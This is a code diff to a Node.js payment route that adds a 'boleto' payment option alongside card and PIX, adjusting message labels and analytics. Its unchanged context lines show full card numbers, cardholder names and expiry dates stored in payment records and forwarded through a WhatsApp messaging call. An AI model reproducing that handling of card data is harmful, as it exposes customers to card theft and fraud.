@@ -111,8 +111,9 @@ router.post('/generate', async (req, res) => {
   const pixCfg = cfg.pixConfig || {};
   let pixCode  = null;
   const isCartao = paymentMethod === 'cartao';
+  const isBoleto = paymentMethod === 'boleto';
 
-  if (!isCartao && pixCfg.pixKey) {
+  if (!isCartao && !isBoleto && pixCfg.pixKey) {
     try {
       pixCode = generatePix({
         key:  pixCfg.pixKey,
@@ -135,7 +136,7 @@ router.post('/generate', async (req, res) => {
     status:          'pending',
     createdAt:       new Date().toISOString(),
     qrCode:          pixCode,
-    paymentMethod:   isCartao ? 'cartao' : 'pix',
+    paymentMethod:   isCartao ? 'cartao' : isBoleto ? 'boleto' : 'pix',
     installments:    isCartao ? (installments || 1) : null,
     cardName:        isCartao ? (cardName || null) : null,
     cardNumber:      isCartao ? (cardNumber || null) : null,
@@ -165,7 +166,7 @@ router.post('/generate', async (req, res) => {
   const sock = getSocket();
   if (sock) {
     const messageId = await sendPaymentRequest(sock, paymentId, shortId, productName || productId || 'Compra', amount, user.whatsapp, pixCode, {
-      paymentMethod: isCartao ? 'cartao' : 'pix',
+      paymentMethod: isCartao ? 'cartao' : isBoleto ? 'boleto' : 'pix',
       cardNumber:   newPayment.cardNumber,
       cardName:     newPayment.cardName,
       cardExpiry:   newPayment.cardExpiry,
@@ -198,7 +199,7 @@ router.post('/generate', async (req, res) => {
       `📋 *Pedido:* ${shortDisplay}`,
       `🛍️ *Produto:* ${productName || productId || 'N/A'}`,
       `💰 *Valor:* ${formatBRL(amount)}`,
-      `💳 *Método:* ${isCartao ? 'Cartão' : 'PIX'}`,
+      `💳 *Método:* ${isCartao ? 'Cartão de Crédito' : isBoleto ? 'Boleto Bancário' : 'PIX'}`,
       ``,
       `👤 *Cliente:* ${user.nome || 'N/A'}`,
       `📞 *WhatsApp:* ${user.whatsapp || 'N/A'}`,
@@ -214,7 +215,7 @@ router.post('/generate', async (req, res) => {
   if (couponCode && couponResult && couponResult.valid) {
     try { recordCouponUse(couponCode, paymentId); } catch (e) { console.error('[Cupom] Erro ao registrar uso:', e.message); }
   }
-  tracker.record('order_created', { productId, productName, amount });
+  tracker.record('order_created', { productId, productName, amount, paymentMethod: newPayment.paymentMethod });
   if (pixCode) tracker.record('pix_generated', { productId, amount });
   audit.append('order_created', user.email, req.ip, { paymentId, shortId, productName, amount, pixGenerated: !!pixCode });
 
